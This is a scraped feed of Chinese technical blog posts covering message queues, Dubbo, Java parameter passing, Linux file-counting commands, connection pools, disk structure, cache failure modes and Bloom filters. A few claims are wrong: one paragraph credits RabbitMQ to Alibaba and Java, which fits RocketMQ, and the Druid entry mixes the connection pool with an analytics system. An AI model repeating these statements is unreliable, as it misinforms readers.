一致性问题本来好好的，A系统调用BC系统接口，如果BC系统出错了，会抛出异常，返回给A系统让A系统知道，这样的话就可以做回滚操作了 但是使用了MQ之后，A系统发送完消息就完事了，认为成功了。而刚好C系统写数据库的时候失败了，但是A认为C已经成功了？这样一来数据就不一致了。 JMS VS AMQPJMSJMS（Java Message Service，Java 消息服务）是java的消息服务，JMS的客户端之间可以通过JMS服务进行异步的消息传输。 JMS（Java Message Service，Java 消息服务）API是一个消息服务的标准或者说是规范，允许应用程序组件基于JavaEE平台创建、发送、接收和读取消息。它使分布式通信耦合度更低，消息服务更加可靠以及异步性。 ActiveMQ 就是基于 JMS 规范实现的。 JMS两种消息模型点到点（P2P）模型 使用队列（Queue）作为消息通信载体；满足生产者与消费者模式，一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。比如：我们生产者发送100条消息的话，两个消费者来消费一般情况下两个消费者会按照消息发送的顺序各自消费一半（也就是你一个我一个的消费。） 发布/订阅（Pub/Sub）模型发布订阅模型（Pub/Sub） 使用主题（Topic）作为消息通信载体，类似于广播模式；发布者发布一条消息，该消息通过主题传递给所有的订阅者，在一条消息广播之后才订阅的用户则是收不到该条消息的。 AMQPAMQP，即Advanced Message Queuing Protocol,一个提供统一消息服务的应用层标准高级消息队列协议（二进制应用层协议），是应用层协议的一个开放标准,为面向消息的中间件设计，兼容 JMS。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件同产品，不同的开发语言等条件的限制。 RabbitMQ 就是基于 AMQP 协议实现的。 JMS 与 AMQP 对比 对比方向 JMS AMQP 定义 Java API 协议 跨语言 否 是 跨平台 否 是 支持消息类型 提供两种消息模型：Peer-2-Peer; Pub/sub 提供了五种消息模型：①direct exchange；②fanout exchange；③topic change；④headers exchange；⑤system exchange。本质来讲，后四种和JMS的pub/sub模型没有太大差别，仅是在路由机制上做了更详细的划分； 支持消息类型 支持多种消息类型 ，我们在上面提到过 byte[]（二进制） 总结： AMQP 为消息定义了线路层（wire-level protocol）的协议，而JMS所定义的是API规范。在 Java 体系中，多个client均可以通过JMS进行交互，不需要应用修改代码，但是其对跨平台的支持较差。而AMQP天然具有跨平台、跨语言特性。 JMS 支持TextMessage、MapMessage 等复杂的消息类型；而 AMQP 仅支持 byte[] 消息类型（复杂的类型可序列化后发送）。 由于Exchange 提供的路由算法，AMQP可以提供多样化的路由方式来传递消息到消息队列，而 JMS 仅支持 队列 和 主题/订阅 方式两种。 常见的消息队列对比 对比方向 概要 吞吐量 万级的 ActiveMQ 和 RabbitMQ 的吞吐量（ActiveMQ 的性能最差）要比十万级甚至是百万级的 RocketMQ 和 Kafka 低一个数量级。 可用性 都可以实现高可用。ActiveMQ 和 RabbitMQ 都是基于主从架构实现高可用性。RocketMQ 基于分布式架构。 kafka 也是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用 时效性 RabbitMQ 基于erlang开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。其他三个都是 ms 级。 功能支持 除了 Kafka，其他三个功能都较为完备。 Kafka 功能较为简单，主要支持简单的MQ功能，在大数据领域的实时计算以及日志采集被大规模使用，是事实上的标准 消息丢失 ActiveMQ 和 RabbitMQ 丢失的可能性非常低， RocketMQ 和 Kafka 理论上不会丢失。 总结： ActiveMQ 的社区算是比较成熟，但是较目前来说，ActiveMQ 的性能比较差，而且版本迭代很慢，不推荐使用。 RabbitMQ 在吞吐量方面虽然稍逊于 Kafka 和 RocketMQ ，但是由于它基于 erlang 开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。但是也因为 RabbitMQ 基于 erlang 开发，所以国内很少有公司有实力做erlang源码级别的研究和定制。如果业务场景对并发量要求不是太高（十万级、百万级），那这四种消息队列中，RabbitMQ 一定是你的首选。如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。 RocketMQ 阿里出品，Java 系开源项目，源代码我们可以直接阅读，然后可以定制自己公司的MQ，并且 RocketMQ 有阿里巴巴的实际业务场景的实战考验。RocketMQ 社区活跃度相对较为一般，不过也还可以，文档相对来说简单一些，然后接口这块不是按照标准 JMS 规范走的有些系统要迁移需要修改大量代码。还有就是阿里出台的技术，你得做好这个技术万一被抛弃，社区黄掉的风险，那如果你们公司有技术实力我觉得用RocketMQ 挺好的 Kafka 的特点其实很明显，就是仅仅提供较少的核心功能，但是提供超高的吞吐量，ms 级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展。同时 kafka 最好是支撑较少的 topic 数量即可，保证其超高吞吐量。kafka 唯一的一点劣势是有可能消息重复消费，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略这个特性天然适合大数据实时计算以及日志收集。 RabbitMQ是阿里开源的消息中间件，目前已经捐献个Apache基金会，它是由Java语言开发的，具备高吞吐量、高可用性、适合大规模分布式系统应用等特点，经历过双11的洗礼，实力不容小觑。 优点： 单机支持 1 万以上持久化队列 RocketMQ 的所有消息都是持久化的，先写入系统 pagecache(页高速缓冲存储器)，然后刷盘，可以保证内存与磁盘都有一份数据，访问时，直接从内存读取。 模型简单，接口易用（JMS 的接口很多场合并不太实用） 性能非常好，可以大量堆积消息在broker(集群中包含一个或多个服务器，这些服务器被称为broker)中； 支持多种消费，包括集群消费、广播消费等。 各个环节分布式扩展设计，主从HA(高可用性集群)； 开发度较活跃，版本更新很快。 缺点： 支持的客户端语言不多，目前是java及c++，其中c++不成熟； RocketMQ社区关注度及成熟度也不及前两者； 没有web管理界面，提供了一个CLI(命令行界面)管理工具带来查询、管理和诊断各种问题； 没有在 mq 核心中去实现JMS等接口； 常见应用场景 邮箱发送：用户注册后投递消息到rabbitmq中，由消息的消费方异步的发送邮件，提升系统响应速度 流量削峰：一般在秒杀活动中应用广泛，秒杀会因为流量过大，导致应用挂掉，为了解决这个问题，一般在应用前端加入消息队列。用于控制活动人数，将超过此一定阀值的订单直接丢弃。缓解短时间的高流量压垮应用。 订单超时：利用rabbitmq的延迟队列，可以很简单的实现订单超时的功能，比如用户在下单后30分钟未支付取消订单 ActiveMQRocketMQKafka如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。 Reference新手也能看懂，消息队列其实很简单 - https://mp.weixin.qq.com/s?__biz=MzI3NzE0NjcwMg==&amp;mid=2650122907&amp;idx=1&amp;sn=99ec2c658ec8164dc73f18b25e3e5525&amp;chksm=f36bb7bac41c3eac17b3fd6428ca5ac292faf8d4d4d7b2128bc3b566d6b59a0c28ae56632bbe&amp;scene=21#wechat_redirect 《大型网站技术架构》 《Java工程师面试突击第1季-中华石杉老师》 90%的Java程序员，都扛不住这波消息中间件的面试四连炮！ - https://zhuanlan.zhihu.com/p/72728396","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】Dubbo入门","date":"2019-07-10T04:54:47.000Z","path":"2019/07/10/【Distributed-System】Dubbo入门/","text":"Dubbo 服务，就是远程server启动一个服务，来处理client的调用。 调用服务，顾名思义，一般使用rpc，简单方便，通过代理调用，跟调用普通对象方法一样。 协议，client调用服务，实际上就是client与server之间的一次通讯，协议就是定义通讯的标准，以便双方可以正常的发送/接受/组织/识别数据数据等，包含如传输的子协议，序列化的技术等等。 服务识别，就是说client要知道服务在台机器上，这样client才能调用服务。单机服务直接写死一个ip+port就行了，但是分布式服务，还需要支持动态扩容的话，就得需要一种机制来时刻给client通知最新的服务分布在哪些机器上。一般使用单独注册中心来管理与通知这些服务分布情况。 均衡负载，就是说服务一般由多个server来提供，要将请求均摊到各个server中，一般是在client端实现的，是结合2调用服务 + 4服务识别来实现的。 总结：最简单的理解就是 dubbo = rpc + 注册中心 dubbo为什么需要和zookeeper结合使用，zookeeper在dubbo体系中起到什么作用？dubbo是一个prc远程服务调用框架，需要一个注册中心去管理每个服务的集群。zookeeper在dubbo中扮演一个注册中心的角色（当然也可以不选择zookeeper），zookeeper用来注册服务和进行负载均衡。 哪一个服务由哪一个机器来提供，必须让调用者知道。也就是ip地址和服务名对应关系。也可以把这种对应关系通过硬编码的方式加在调用者的业务中，但是一旦提供的服务挂掉调用者无法知晓。zookeeper通过心跳机制来检测并将挂掉的机器从列表中删除。可以在不更改代码的情况下通过添加机器来解决高并发。 Reference 阿里的dubbo 到底是用来干嘛的？ - https://www.zhihu.com/question/30971953 深入浅出微服务框架dubbo(一):基础篇 - https://www.imooc.com/article/22585","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Java】值传递与引用传递","date":"2019-07-10T02:59:04.000Z","path":"2019/07/10/【Java】引用-值传递与引用传递/","text":"实际参数与形式参数我们都知道，在Java中定义方法的时候是可以定义参数的。比如Java中的main方法： 1public static void main(String[] args) 这里面的args就是参数。参数在程序语言中分为形式参数和实际参数。 形式参数：是在定义函数名和函数体的时候使用的参数,目的是用来接收调用该函数时传入的参数。 ****：在调用有参函数时，主调函数和被调函数之间有数据传递关系。在主调函数中调用一个函数时，函数名后面括号中的参数称为“实际参数”。 简单举个例子： 12345678public static void main(String[] args) &#123; ParamTest pt = new ParamTest(); pt.sout(\"Hollis\");//实际参数为 Hollis&#125;public void sout(String name) &#123; //形式参数为 name System.out.println(name);&#125; 实际参数是调用有参方法的时候真正传递的内容，而形式参数是用于接收实参内容的参数。 值传递（pass by value）与引用传递（pass by reference）上面提到了，当我们调用一个有参函数的时候，会把实际参数传递给形式参数。但是，在程序语言中，这个传递过程中传递的两种情况，即值传递和引用传递。我们来看下程序语言中是如何定义和区分值传递和引用传递的。 值传递（pass by value）是指在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。 引用传递（pass by reference）是指在调用函数时将实际参数的地址直接传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。 例子 1有了上面的概念，然后大家就可以写代码实践了，来看看Java中到底是值传递还是引用传递 ，于是，最简单的一段代码出来了： 123456789101112public static void main(String[] args) &#123; ParamTest pt = new ParamTest(); int i = 10; pt.pass(i); System.out.println(\"print in main , i is \" + i);&#125;public void pass(int j) &#123; j = 20; System.out.println(\"print in pass , j is \" + j);&#125; 上面的代码中，我们在pass方法中修改了参数j的值，然后分别在pass方法和main方法中打印参数的值。输出结果如下： 12print in pass , j is 20print in main , i is 10 可见，pass方法内部对name的值的修改并没有改变实际参数i的值。那么，按照上面的定义，有人得到结论：Java的方法传递是值传递。 例子 2但是，很快就有人提出质疑了。然后，他们会搬出以下代码： 1234567891011121314public static void main(String[] args) &#123; ParamTest pt = new ParamTest(); User hollis = new User(); hollis.setName(\"Hollis\"); hollis.setGender(\"Male\"); pt.pass(hollis); System.out.println(\"print in main , user is \" + hollis);&#125;public void pass(User user) &#123; user.setName(\"hollischuang\"); System.out.println(\"print in pass , user is \" + user);&#125; 同样是一个pass方法，同样是在pass方法内修改参数的值。输出结果如下： 12print in pass , user is User&#123;name=&apos;hollischuang&apos;, gender=&apos;Male&apos;&#125;print in main , user is User&#123;name=&apos;hollischuang&apos;, gender=&apos;Male&apos;&#125; 经过pass方法执行后，实参的值竟然被改变了，那按照上面的引用传递的定义，实际参数的值被改变了，这不就是引用传递了么。于是，根据上面的两段代码，有人得出一个新的结论：Java的方法中，在传递普通类型的时候是值传递，在传递对象类型的时候是引用传递。 例子 3但是，这种表述仍然是错误的。不信你看下面这个参数类型为对象的参数传递： 123456789101112public static void main(String[] args) &#123; ParamTest pt = new ParamTest(); String name = \"Hollis\"; pt.pass(name); System.out.println(\"print in main , name is \" + name);&#125;public void pass(String name) &#123; name = \"hollischuang\"; System.out.println(\"print in pass , name is \" + name);&#125; 上面的代码输出结果为 12print in pass , name is hollischuangprint in main , name is Hollis 这又作何解释呢？同样传递了一个对象，但是原始参数的值并没有被修改，难道传递对象又变成值传递了？ 例子 4还拿上面的一个例子来举例，我们真正的改变参数，看看会发生什么？ 12345678910111213141516public static void main(String[] args) &#123; ParamTest pt = new ParamTest(); User hollis = new User(); hollis.setName(\"Hollis\"); hollis.setGender(\"Male\"); pt.pass(hollis); System.out.println(\"print in main , user is \" + hollis);&#125;public void pass(User user) &#123; user = new User(); user.setName(\"hollischuang\"); user.setGender(\"Male\"); System.out.println(\"print in pass , user is \" + user);&#125; 上面的代码中，我们在pass方法中，改变了user对象，输出结果如下： 12print in pass , user is User&#123;name=&apos;hollischuang&apos;, gender=&apos;Male&apos;&#125;print in main , user is User&#123;name=&apos;Hollis&apos;, gender=&apos;Male&apos;&#125; 我们来画一张图，看一下整个过程中发生了什么，然后我再告诉你，为啥Java中只有值传递。 稍微解释下上面这张图，当我们在main中创建一个User对象的时候，在堆中开辟一块内存，其中保存了name和gender等数据。然后hollis持有该内存的地址0x123456。 当尝试调用pass方法，并且hollis作为实际参数传递给形式参数user的时候，会把这个地址0x123456交给user，这时，user也指向了这个地址。 然后在pass方法内对参数进行修改的时候，即user = new User();，会重新开辟一块0X456789的内存，赋值给user。后面对user的任何修改都不会改变内存0X123456的内容。 上面这种传递是什么传递？肯定不是引用传递，如果是引用传递的话，在执行 user = new User(); 的时候，实际参数的引用也应该改为指向0X456789，但是实际上并没有。 通过概念我们也能知道，这里是把实际参数的引用的地址复制了一份，传递给了形式参数。所以，上面的参数其实是值传递，把实参对象引用的地址当做值传递给了形式参数。 我们再来回顾下之前的那个“砸电视”的例子，看那个例子中的传递过程发生了什么。 同样的，在参数传递的过程中，实际参数的地址0X1213456被拷贝给了形参，只是，在这个方法中，并没有对形参本身进行修改，而是修改的形参持有的地址中存储的内容。 所以，值传递和引用传递的区别并不是传递的内容。而是实参到底有没有被复制一份给形参。在判断实参内容有没有受影响的时候，要看传的的是什么，如果你传递的是个地址，那么就看这个地址的变化会不会有影响，而不是看地址指向的对象的变化。 那么，既然这样，为啥上面同样是传递对象，传递的String对象和User对象的表现结果不一样呢？我们在pass方法中使用name = &quot;hollischuang&quot;;试着去更改name的值，阴差阳错的直接改变了name的引用的地址。因为这段代码，会new一个String，再把引用交给name，即等价于： 1name = new String(\"hollischuang\"); 而原来的那个”Hollis”字符串还是由实参持有着的，所以，并没有修改到实际参数的值。 所以说，Java中其实还是值传递的，只不过对于对象参数，值的内容是对象的引用。 Reference 为什么说Java中只有值传递。- https://mp.weixin.qq.com/s?__biz=MzI3NzE0NjcwMg==&amp;mid=2650121036&amp;idx=1&amp;sn=9b23486a7ca3a9b92765549f1ac29274&amp;chksm=f36bbe6dc41c377b4489e5608b4c8162e50642ce5b94a04dc80ceb10701ecd32d1da37d18909&amp;scene=21#wechat_redirect Java中传值与传引用 - https://www.cnblogs.com/zhengbin/p/5680758.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Linux】统计某文件/文件夹个数","date":"2019-07-10T02:30:12.000Z","path":"2019/07/10/【Linux】操作-统计某文件-文件夹个数/","text":"统计某文件夹下文件的个数1$ ls -l |grep \"^-\"|wc -l 统计某文件夹下目录的个数1$ ls -l |grep \"^ｄ\"|wc -l 统计文件夹下文件的个数，包括子文件夹里的1$ ls -lR|grep \"^-\"|wc -l 如统计/home/han目录(包含子目录)下的所有js文件1$ ls -lR /home/han|grep js|wc -l 或者 1$ ls -l \"/home/han\"|grep \"js\"|wc -l 统计文件夹下目录的个数，包括子文件夹里的1$ ls -lR|grep \"^d\"|wc -l 说明 ls -lR：长列表输出该目录下文件信息（R代表子目录；注意这里的文件，不同于一般的文件，可能是目录、链接、设备文件等）; grep &quot;^-&quot;：这里将长列表输出信息过滤一部分，只保留一般文件；如果只保留目录就是 ^d； wc -l：统计输出信息的行数，因为已经过滤得只剩一般文件了，所以统计结果就是一般文件信息的行数，又由于一行信息对应一个文件，所以也就是文件的个数； 如果只查看文件夹： ls -d ：只能显示一个 find -type d：可以看到子文件夹 ls -lF |grep / 或 ls -l |grep &#39;^d&#39;：只看当前目录下的文件夹，不包括往下的文件夹 Reference Linux统计某文件夹下文件、文件夹的个数 - http://blog.sina.com.cn/s/blog_464f6dba01012vwv.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Database】数据库连接池","date":"2019-07-09T13:36:18.000Z","path":"2019/07/09/【DataBase】数据库连接池/","text":"数据库连接池（Database Connection Pool）所谓的数据库连接池（Database Connection Pool），就是用来分配，管理，释放数据库连接的。 你也许会问，好像我直接用JDBC也能够实现这些功能吧。嗯，你说的没错，JDBC确实也可以，但是，你记不记得，我们使用JDBC技术的时候，每次用完了，是不是都会将连接关闭；等到下一次再用的时候，是不是都得将数据库连接再打开？ 实际上，数据库链接资源是十分宝贵的，我们在小型的项目中还看不出来，在高并发的项目中，你会发现，这样频繁的打开和关闭数据库链接是对服务器的一种摧残，十分影响效率。 那么，数据库连接池是如何做的呢？ 实现思路是这样的：在每次有访问的时候，数据库连接池会给用户分配一个数据库连接，当用户用完了连接之后，连接池再将连接回收，放回一个连接集合中： 主流数据库连接池常用的主流开源数据库连接池有C3P0、DBCP、Tomcat Jdbc Pool、BoneCP、Druid等。 C3p0: 开源的JDBC连接池，实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。单线程，性能较差，适用于小型系统，代码600KB左右。 DBCP (Database Connection Pool):由Apache开发的一个Java数据库连接池项目， Jakarta commons-pool对象池机制，Tomcat使用的连接池组件就是DBCP。单独使用dbcp需要3个包：common-dbcp.jar,common-pool.jar,common-collections.jar，预先将数据库连接放在内存中，应用程序需要建立数据库连接时直接到连接池中申请一个就行，用完再放回。单线程，并发量低，性能不好，适用于小型系统。 Tomcat Jdbc Pool：Tomcat在7.0以前都是使用common-dbcp做为连接池组件，但是dbcp是单线程，为保证线程安全会锁整个连接池，性能较差，dbcp有超过60个类，也相对复杂。Tomcat从7.0开始引入了新增连接池模块叫做Tomcat jdbc pool，基于Tomcat JULI，使用Tomcat日志框架，完全兼容dbcp，通过异步方式获取连接，支持高并发应用环境，超级简单核心文件只有8个，支持JMX，支持XA Connection。 BoneCP：官方说法BoneCP是一个高效、免费、开源的Java数据库连接池实现库。设计初衷就是为了提高数据库连接池性能，根据某些测试数据显示，BoneCP的速度是最快的，要比当时第二快速的连接池快25倍左右，完美集成到一些持久化产品如Hibernate和DataNucleus中。BoneCP特色：高度可扩展，快速；连接状态切换的回调机制；允许直接访问连接；自动化重置能力；JMX支持；懒加载能力；支持XML和属性文件配置方式；较好的Java代码组织，100%单元测试分支代码覆盖率；代码40KB左右。 Druid：Druid是Java语言中最好的数据库连接池，Druid能够提供强大的监控和扩展功能，是一个可用于大数据实时查询和分析的高容错、高性能的开源分布式系统，尤其是当发生代码部署、机器故障以及其他产品系统遇到宕机等情况时，Druid仍能够保持100%正常运行。主要特色：为分析监控设计；快速的交互式查询；高可用；可扩展；Druid是一个开源项目，源码托管在github上。 Reference 主流Java数据库连接池比较及前瞻 - http://blog.didispace.com/java-datasource-pool-compare/ 数据库连接池技术详解 - https://juejin.im/post/5b7944c6e51d4538c86cf195 Day 9. Using JDBC to Connect to a Database - https://ejbvn.wordpress.com/category/week-2-entity-beans-and-message-driven-beans/day-09-using-jdbc-to-connect-to-a-database/ Glassfish - How to setup mysql JDBC connection pool in Glassfish admin console - https://www.youtube.com/watch?v=5v5h1ZkfcFU Chapter 7 Connection Pooling with Connector/J - https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-usagenotes-j2ee-concepts-connection-pooling.html A Simple Guide to Connection Pooling in Java - https://www.baeldung.com/java-connection-pooling Connection Pooling - https://docs.oracle.com/javase/jndi/tutorial/ldap/connect/pool.html Database Connection Pooling with Java - https://devcenter.heroku.com/articles/database-connection-pooling-with-java What is database pooling? - https://stackoverflow.com/questions/4041114/what-is-database-pooling","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Operating System】I/O - 磁盘I/O相关概念","date":"2019-07-09T04:27:31.000Z","path":"2019/07/09/【Operating-System】IO-磁盘I-O相关概念/","text":"磁盘构造硬盘中一般会有多个盘片（platter）组成，每个盘片包含两个面，每个盘面都对应地有一个读/写磁头（head）。受到硬盘整体体积和生产成本的限制，盘片数量都受到限制，一般都在5片以内。盘片的编号自下向上从0开始，如最下边的盘片的两个盘面分别编号为0面和1面，再上一个盘片的两个盘面就分别编号为2面和3面。 下图显示的是一个盘面，盘面中一圈圈灰色同心圆为一条条磁道（track），从圆心向外画直线，可以将磁道划分为若干个弧段，每个磁道上一个弧段被称之为一个扇区（sector）。在下图中，绿色部分为其中的一个扇区。 扇区是磁盘中最小的物理存储单位。通常情况下每个扇区的大小是512字节（由于磁盘的大小不断提高，因此部分容量较大的新硬盘的扇区的大小被设置为4096字节，比如 4T 大小的移动硬盘）。 硬盘通常由重叠的一组盘片（platter）构成，每个盘面都被划分为数目相等的磁道，并从外缘的“0”开始编号，具有相同编号的磁道形成一个圆柱，称之为磁盘的柱面（cylinder）。磁盘的柱面数与一个盘面上的磁道数是相等的。由于每个盘面都有自己的磁头，因此，盘面数等于总的磁头数。 如下图： 扇区（Sector）和磁盘块（Block）扇区（Sector）物理层面：一个磁盘由大到小按层次分为磁盘组合 -&gt; 单个磁盘 -&gt; 某一盘面（platter）/磁头（head） -&gt; 某一磁道（track） -&gt; 某一扇区（Sector）。 前面已经提到了，扇区（Sector），顾名思义，每个磁盘有多条同心圆似的磁道（track），磁道被分割成多个部分。每部分的弧长加上到圆心的两个半径，恰好形成一个扇形，所以叫做扇区。 磁盘块（Block）逻辑层面： 磁盘块，或者直接称为块（Block），块是虚拟出来的，是操作系统中最小的逻辑存储单位。操作系统与磁盘打交道的最小单位是磁盘块。 在Windows下，如NTFS等文件系统中叫做簇（cluster），每个簇或者块可以包括2、4、8、16、32、64…2的n次方个扇区。 在Linux下如Ext4等文件系统中叫做块（block）。 其实，簇和块是同样的概念。 为什么存在磁盘块？读取方便：由于扇区的数量比较小，数目众多在寻址时比较困难，所以操作系统就将相邻的扇区组合在一起，形成一个块，再对块进行整体的操作。 分离对底层的依赖：操作系统忽略对底层物理存储结构的设计。通过虚拟出来磁盘块的概念，在系统中认为块是最小的单位。 磁盘块与扇区的大小既然磁盘块是一个虚拟概念。是操作系统自己＂杜撰＂的软件的概念，不是真实的。所以，磁盘块的大小由操作系统决定，操作系统可以配置一个块多大。 一个块大小=一个扇区大小*2的n次方。 n是可以修改的。 块与页的关系操作系统经常与内存和硬盘这两种存储设备进行通信，类似于“块”的概念，都需要一种虚拟的基本单位。所以，与内存操作，是虚拟一个页的概念来作为最小单位。与硬盘打交道，就是以块为最小单位。 Reference Wikipedia Disk sector - https://en.wikipedia.org/wiki/Disk_sector 硬盘基本知识（磁头、磁道、扇区、柱面） - https://www.jianshu.com/p/9aa66f634ed6","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Cache System】缓存穿透、缓存雪崩与缓存击穿","date":"2019-07-08T14:31:11.000Z","path":"2019/07/08/【Cache-System】缓存穿透、缓存雪崩与缓存击穿/","text":"缓存穿透问题缓存穿透是指查询一个根本不存在的数据，缓存层和存储层都不会命中，但是出于容错的考虑，如果从存储层查不到数据则不写入缓存层，如下图所示整个过程分为如下 3 步： 缓存层不命中 存储层不命中，所以不将空结果写回缓存 返回空结果 缓存穿透将导致不存在的数据每次请求都要到存储层去查询，失去了缓存保护后端存储的意义。 缓存穿透问题可能会使后端存储负载加大，由于很多后端存储不具备高并发性，甚至可能造成后端存储宕掉。通常可以在程序中分别统计总调用数、缓存层命中数、存储层命中数，如果发现大量存储层空命中，可能就是出现了缓存穿透问题。 缓存穿透的解决方法1）缓存空对象如下图所示，当第 2 步存储层不命中后，仍然将空对象保留到缓存层中，之后再访问这个数据将会从缓存中获取，保护了后端数据源。 缓存空对象会有两个问题： 第一，空值做了缓存，意味着缓存层中存了更多的键，需要更多的内存空间 ( 如果是攻击，问题更严重 )，比较有效的方法是针对这类数据设置一个较短的过期时间，让其自动剔除。 第二，缓存层和存储层的数据会有一段时间窗口的不一致，可能会对业务有一定影响。例如过期时间设置为 5 分钟，如果此时存储层添加了这个数据，那此段时间就会出现缓存层和存储层数据的不一致，此时可以利用消息系统或者其他方式清除掉缓存层中的空对象。 2）布隆过滤器拦截 如上图所示，在访问缓存层和存储层之前，将存在的 key 用布隆过滤器提前保存起来，做第一层拦截。例如： 一个个性化推荐系统有 4 亿个用户 ID，每个小时算法工程师会根据每个用户之前历史行为做出来的个性化放到存储层中，但是最新的用户由于没有历史行为，就会发生缓存穿透的行为，为此可以将所有有个性化推荐数据的用户做成布隆过滤器。如果布隆过滤器认为该用户 ID 不存在，那么就不会访问存储层，在一定程度保护了存储层。 缓存雪崩问题从下图可以很清晰出什么是缓存雪崩：由于缓存层承载着大量请求，有效的保护了存储层，但是如果缓存层由于某些原因整体不能提供服务，于是所有的请求都会达到存储层，存储层的调用量会暴增，造成存储层也会挂掉的情况。 缓存雪崩的英文原意是 stampeding herd（奔逃的野牛），指的是缓存层宕掉后，流量会像奔逃的野牛一样，打向后端存储。 缓存雪崩问题预防和解决缓存雪崩问题，可以从以下三个方面进行着手。 1）保证缓存层服务高可用性和飞机都有多个引擎一样，如果缓存层设计成高可用的，即使个别节点、个别机器、甚至是机房宕掉，依然可以提供服务，例如前面介绍过的 Redis Sentinel 和 Redis Cluster 都实现了高可用。 2） 为时效时间增加随机值一个简单且有效的方案就是将缓存失效时间分散开，比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。 3）依赖隔离组件为后端限流并降级无论是缓存层还是存储层都会有出错的概率，可以将它们视同为资源。作为并发量较大的系统，假如有一个资源不可用，可能会造成线程全部 hang 在这个资源上，造成整个系统不可用。降级在高并发系统中是非常正常的：比如推荐服务中，如果个性化推荐服务不可用，可以降级补充热点数据，不至于造成前端页面是开天窗。 在实际项目中，我们需要对重要的资源 ( 例如 Redis、 MySQL、 Hbase、外部接口 ) 都进行隔离，让每种资源都单独运行在自己的线程池中，即使个别资源出现了问题，对其他服务没有影响。但是线程池如何管理，比如如何关闭资源池，开启资源池，资源池阀值管理，这些做起来还是相当复杂的，这里推荐一个 Java 依赖隔离工具 Hystrix(https://github.com/Netflix/Hystrix)， 缓存击穿问题对于一些设置了过期时间的key，如果这些key可能会在某些时间点被超高并发地访问，是一种非常“热点”的数据。这个时候，需要考虑一个问题：缓存被“击穿”的问题，缓存击穿和缓存雪崩的区别在于前者针对某一key缓存，后者则是很多key。 缓存在某个时间点过期的时候，恰好在这个时间点对这个Key有大量的并发请求过来，这些请求发现缓存过期一般都会从后端DB加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端DB压垮。 Reference 缓存穿透，缓存击穿，缓存雪崩解决方案分析 - https://blog.csdn.net/zeb_perfect/article/details/54135506","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"}]},{"title":"【Algorithm】海量数据处理 - 布隆过滤器（Bloom Filter）","date":"2019-07-05T08:30:44.000Z","path":"2019/07/05/【Algorithm】海量数据处理-布隆过滤器/","text":"判断一个元素是否存在一个集合中先来看几个比较常见的例子 字处理软件中，需要检查一个英语单词是否拼写正确 在 FBI，一个嫌疑人的名字是否已经在嫌疑名单上 在网络爬虫里，一个网址是否被访问过 yahoo, gmail等邮箱垃圾邮件过滤功能 这几个例子有一个共同的特点： 如何判断一个元素是否存在一个集合中？ 常规思路： 数组 链表 树、平衡二叉树、Trie HashMap （红黑树）：通过将值映射到 HashMap 中，就可以在 O(1) 的时间复杂度内返回结果（判断这个元素是否在集合中），效率奇高。但是 HashMap 的实现也有缺点，例如存储容量占比高，考虑到负载因子的存在，通常空间是不能被用满的，而一旦你的值很多例如上亿的时候，那 HashMap 占据的内存大小就变得很可观了。 哈希表 虽然上面描述的这几种数据结构配合常见的排序、二分搜索可以快速高效的处理绝大部分判断元素是否存在集合中的需求。 但是当集合里面的元素数量足够大，如果有500万条记录甚至1亿条记录呢？这个时候常规的数据结构的问题就凸显出来了。 数组、链表、树等数据结构会存储元素的内容，一旦数据量过大，消耗的内存也会呈现线性增长，最终达到瓶颈。 有的同学可能会问，哈希表不是效率很高吗？查询效率可以达到O(1)。但是哈希表需要消耗的内存依然很高。使用哈希表存储一亿个垃圾 email 地址的消耗？ 哈希表的做法：首先，哈希函数将一个email地址映射成8字节信息指纹；考虑到哈希表存储效率通常小于50%（哈希冲突）；因此消耗的内存：8 * 2 * 1亿 字节 = 1.6G 内存，普通计算机是无法提供如此大的内存。这个时候，布隆过滤器（Bloom Filter）就应运而生。在继续介绍布隆过滤器的原理时，先讲解下关于哈希函数的预备知识。 什么是 Bloom FilterBloom 